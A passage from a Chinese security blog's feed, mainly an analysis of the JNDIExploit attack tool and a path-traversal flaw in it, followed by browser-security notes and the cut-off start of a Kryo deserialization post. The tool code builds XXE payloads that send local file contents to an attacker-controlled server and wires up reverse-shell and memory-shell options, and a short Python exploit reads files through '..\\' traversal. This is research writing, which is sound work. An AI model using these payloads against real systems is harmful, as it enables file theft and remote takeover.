bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleWSDLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> exchange.getRequestURI().getQuery();</span><br><span class="line">        Map&lt;String, String&gt; params = parseQuery(query);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath().substring(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;list&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">//intended to list directories or read files on server</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> params.get(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; !file.isEmpty()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">listWsdl</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;!DOCTYPE x [\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % aaa SYSTEM \&quot;file:///&quot;</span> + file + <span class="string">&quot;\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % bbb SYSTEM \&quot;http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/http.wsdl\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  %bbb;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;]&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;definitions name=\&quot;HelloService\&quot; xmlns=\&quot;http://schemas.xmlsoap.org/wsdl/\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &amp;ddd;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/definitions&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, listWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(listWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;upload&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> params.get(<span class="string">&quot;type&quot;</span>);</span><br><span class="line"></span><br><span class="line">            String[] args = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;dnslog&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;url&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;ip&quot;</span>), params.get(<span class="string">&quot;port&quot;</span>)&#125;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> createJar(type, args);</span><br><span class="line">            <span class="keyword">if</span> (jarName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">uploadWsdl</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE a SYSTEM \&quot;jar:http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort +</span><br><span class="line">                        <span class="string">&quot;/&quot;</span> + jarName + <span class="string">&quot;.jar!/file.txt\&quot;&gt;&lt;a&gt;&lt;/a&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, uploadWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(uploadWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;http&quot;</span>))  &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xxhttp</span> <span class="operator">=</span> <span class="string">&quot;&lt;!ENTITY % ccc &#x27;&lt;!ENTITY ddd &amp;#39;&lt;import namespace=\&quot;uri\&quot; location=\&quot;http://&quot;</span> +</span><br><span class="line">                    Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/xxelog?%aaa;\&quot;/&gt;&amp;#39;&gt;&#x27;&gt;%ccc;&quot;</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xxhttp.getBytes().length);</span><br><span class="line">            exchange.getResponseBody().write(xxhttp.getBytes());</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title function_">parseQuery</span><span class="params">(String query)</span>&#123;</span><br><span class="line">        Map&lt;String,String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(String str : query.split(<span class="string">&quot;&amp;&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    String[] parts = str.split(<span class="string">&quot;=&quot;</span>,<span class="number">2</span>);</span><br><span class="line">                    params.put(parts[<span class="number">0</span>], parts[<span class="number">1</span>]);</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                    <span class="comment">//continue</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="comment">//continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         由于我本地安装的 Websphere 在加载本地 classpath 这一步复现不成功</span></span><br><span class="line"><span class="comment">         这里不确定 websphere 这种方式在多次操作时 Class 文件名相同时是否会存在问题</span></span><br><span class="line"><span class="comment">         目前暂时认为其不会有问题，如果有问题，后面再修改</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">createJar</span><span class="params">(String type, String... params)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;xExportObject&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">CommandTemplate</span> <span class="variable">commandTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommandTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = commandTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;dnslog&quot;</span>))&#123;</span><br><span class="line">            <span class="type">DnslogTemplate</span> <span class="variable">dnslogTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DnslogTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = dnslogTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ReverseShellTemplate</span> <span class="variable">reverseShellTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReverseShellTemplate</span>(params[<span class="number">0</span>], params[<span class="number">1</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = reverseShellTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;webspherememshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">exploitClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.feihong.ldap.template.WebsphereMemshellTemplate&quot;</span>);</span><br><span class="line">            exploitClass.setName(className);</span><br><span class="line">            exploitClass.detach();</span><br><span class="line">            bytes = exploitClass.toBytecode();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Name of Class in Jar: &quot;</span> + className);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">JarOutputStream</span> <span class="variable">jarOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(bout);</span><br><span class="line">        jarOut.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(className + <span class="string">&quot;.class&quot;</span>));</span><br><span class="line">        jarOut.write(bytes);</span><br><span class="line">        jarOut.closeEntry();</span><br><span class="line">        jarOut.close();</span><br><span class="line">        bout.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> Util.getRandomString();</span><br><span class="line">        Cache.set(jarName, bout.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jarName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>当后缀名不属于if else中的任意一种的时候会进入<code>handleFileRequest</code>中。<br>看看内部处理<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">       <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator +path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">       <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">       <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">           <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">           fileInputStream.read(bytes);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">           exchange.getResponseBody().write(bytes);</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       exchange.close();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><br>他会获取最后一个<code>/</code>并与当前pwd拼接，但是在Windows系统中，路径是用<code>\</code>进行表示的，所以在windows上运行该工具会造成相应的任意文件读取。<br>这里我用python进行攻击<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/4.png" alt><br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/3.png" alt><br>可以看到返回了文件内容。而我d盘下也确实有该文件<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/5.png" alt><br>当然不止<code>handleFileRequest</code>有这个问题，其他的函数都是这么处理的，所以都会导致该漏洞的产生。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filename = <span class="string">&#x27;..\\..\\..\\..\\..\\flag&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:3456/&quot;</span></span><br><span class="line">r = requests.get(url+filename)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;路径穿越漏洞&quot;&gt;&lt;a href=&quot;#路径穿越漏洞&quot; class=&quot;headerlink&quot; title=&quot;路径穿越漏洞&quot;&gt;&lt;/a&gt;路径穿越漏洞&lt;/h2&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>前端安全1-浏览器安全模型（笔记）</title>
    <link href="http://example.com/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-12T02:02:09.000Z</published>
    <updated>2023-09-23T16:24:08.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来这个系列的命名是叫xss入门的，再看了huli大佬的这系列文章以后，还是改为了前端安全。</p><ul><li><a href="https://ithelp.ithome.com.tw/users/20091346/ironman/6155">https://ithelp.ithome.com.tw/users/20091346/ironman/6155</a></li><li><a href="https://blog.huli.tw/">https://blog.huli.tw/</a></li></ul><p>因为是笔记，所以本文都是对于huli大佬的文章的总结和拓展，所以就把参考文章直接放到下面了<br><span id="more"></span></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://ithelp.ithome.com.tw/articles/10314125">https://ithelp.ithome.com.tw/articles/10314125</a></li></ul><h2 id="前端运行环境"><a href="#前端运行环境" class="headerlink" title="前端运行环境"></a>前端运行环境</h2><p><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>先看到上图，前端是运行在浏览器之中的，而浏览器会给前端一大堆的限制</p><h3 id="禁止主动文件读取"><a href="#禁止主动文件读取" class="headerlink" title="禁止主动文件读取"></a>禁止主动文件读取</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> onchange=<span class="string">&quot;show(this)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">input</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="property">onload</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(event.<span class="property">target</span>.<span class="property">result</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="title function_">readAsText</span>(input.<span class="property">files</span>[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这段代码创建了一个input元素，用于上传文件。当文件选择框中选择了文件后，会触发onchange事件，执行show函数。show函数创建了一个FileReader对象，用于读取上传的文件。然后将读取的文件内容转换为文本格式，并通过alert弹窗显示出来。<br>这种只能是人工选择的时候可以读取到，但是不能主动去读取。</p><p>当然也有可以绕过的特例</p><ul><li><a href="https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser">https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser</a></li></ul><p>他是利用了opera: 这个协议有着更高的权限，和一些特殊功能，可以用来访问文件，截图网页等<br>更多细节可以看上面的原文，在这里不过多赘述<br>总结一下就是利用opera访问文件然后对文件内容做了个截图以后回传到攻击端</p><h3 id="禁止使用系统api"><a href="#禁止使用系统api" class="headerlink" title="禁止使用系统api"></a>禁止使用系统api</h3><p>这里只能使用一些浏览器提供的函数，比如fetch之类的<br>当然浏览器也会开放一些api</p><ul><li>Web Bluetooth API</li><li>MediaDevices API</li></ul><h3 id="禁止读取其他网页的内容"><a href="#禁止读取其他网页的内容" class="headerlink" title="禁止读取其他网页的内容"></a>禁止读取其他网页的内容</h3><p>我的kaikaix.github.io是读取不到google.com的任何内容的，这种就是同源策略(same-origin policy)，简称SOP<br>当在控制台输入以下代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://kaikaix.github.io&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(win.<span class="property">location</span>.<span class="property">href</span>)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure><br>这段代码创建了一个新的浏览器窗口并打开了一个指定的网页。然后使用setTimeout函数在3秒后输出新窗口的URL地址。<br>我在blog.huli.tw网站下开启控制台执行的结果如下<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>但是如果我在kaikaix.github.io执行的话<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>就可以成功输出url</p><p>当然也有方法可以拿到其他网站的信息<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1">https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本来这个系列的命名是叫xss入门的，再看了huli大佬的这系列文章以后，还是改为了前端安全。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/users/20091346/ironman/6155&quot;&gt;https://ithelp.ithome.com.tw/users/20091346/ironman/6155&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.huli.tw/&quot;&gt;https://blog.huli.tw/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因为是笔记，所以本文都是对于huli大佬的文章的总结和拓展，所以就把参考文章直接放到下面了&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>python的trick</title>
    <link href="http://example.com/2023/09/11/python%E7%9A%84trick/"/>
    <id>http://example.com/2023/09/11/python%E7%9A%84trick/</id>
    <published>2023-09-11T14:18:20.000Z</published>
    <updated>2023-10-01T17:14:07.316Z</updated>
    
    <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title="#"></a>#</h1><p>python wsgi 中不区分请求头中的- 和_<br>解析参数的顺序</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;#&quot;&gt;&lt;/a&gt;#&lt;/h1&gt;&lt;p&gt;python wsgi 中不区分请求头中的- 和_&lt;br&gt;解析参数的顺序&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>kryo反序列化</title>
    <link href="http://example.com/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-09-07T15:20:02.000Z</published>
    <updated>2023-09-11T06:17:02.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="入门kryo"><a href="#入门kryo" class="headerlink" title="入门kryo"></a>入门kryo</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>首先看个简单的demo<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String hello;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;hello=&#x27;&quot;</span> + hello + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, num=&quot;</span> + num +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHello</span><span class="params">(String hello)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hello = hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 